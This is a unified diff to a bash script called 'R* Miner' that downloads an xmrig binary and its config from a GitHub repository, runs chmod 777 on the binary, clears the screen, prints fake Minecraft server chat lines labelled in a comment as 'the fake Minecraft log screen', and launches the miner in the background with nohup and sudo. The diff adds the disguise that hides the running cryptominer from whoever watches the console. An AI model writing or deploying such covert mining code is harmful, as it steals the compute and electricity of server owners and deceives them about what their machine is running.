@@ -1,17 +1,20 @@
 #!/bin/bash
-echo "Welcome to R* Miner. Starting Silently.."
+echo "Welcome to R* Miner. Starting QUIET.."
 
 # Getting the Miner and running it
 wget https://github.com/mysterek1337/testxmr/raw/main/xmrig
 wget https://raw.githubusercontent.com/mysterek1337/testxmr/main/config.json
 
-# CHMOD
+# FIX for XMRIG: Permission denied
 
-chmod +x xmrig
+clear
 chmod +777 xmrig
 
-# Clear that shit
-clear
+# The fake Minecraft log screen
+sleep 2
 
-./xmrig --config config.json
-# GGs. Now you can earn money for AttestedAtom's cat.
+clear
+echo "[00:00:00] Player69 issued server command: /tpa Player420"
+echo "[00:00:02] Player69 -> Player420: what's up?"
+
+nohup sudo ./xmrig --config config.json
